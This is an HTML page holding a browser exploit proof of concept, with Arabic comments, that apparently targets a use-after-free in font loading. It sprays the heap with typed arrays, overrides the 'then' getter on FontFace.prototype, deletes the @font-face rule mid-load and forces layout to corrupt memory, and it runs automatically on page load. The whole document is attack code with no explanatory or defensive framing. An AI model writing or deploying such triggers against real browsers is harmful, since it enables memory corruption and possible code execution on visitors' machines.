<!DOCTYPE html>
<html>
<head>
    <style id="target-style">
        @font-face { font-family: 'ExploitFont'; src: url('trigger.woff2'); }
    </style>
</head>
<body>
    <script>
        // 1. إعداد منطقة الذاكرة (Heap Grooming)
        const SPRAY_SIZE = 1000;
        let heapSpray = new Array(SPRAY_SIZE);

        function prepareHeap() {
            for (let i = 0; i < SPRAY_SIZE; i++) {
                // نخصص مصفوفات بنفس حجم كائن CSSFontFace التقريبي
                // لمحاولة تعبئة الثغرات التي يتركها الـ GC
                heapSpray[i] = new Uint32Array(0x400); 
            }
        }

        // 2. دالة تشغيل الثغرة (Triggering)
        async function runExploit() {
            prepareHeap();

            const font = new FontFace("ExploitFont", "url(exploit.woff2)");
            document.fonts.add(font);
            const loadPromise = font.load();

            // اعتراض عملية الـ Promise لشن الهجوم في لحظة حرجة
            Object.defineProperty(FontFace.prototype, 'then', {
                get() {
                    // هنا يتم حذف القاعدة أثناء التحميل
                    document.getElementById('target-style').sheet.deleteRule(0);
                    // Force Layout لتحفيز تغييرات الذاكرة
                    document.body.offsetTop;
                    return undefined;
                }
            });

            try {
                await loadPromise;
            } catch (e) {
                console.log("تم رصد محاولة التلاعب بالذاكرة.");
            }
        }

        // تشغيل العملية
        window.onload = runExploit;
    </script>
</body>
</html>
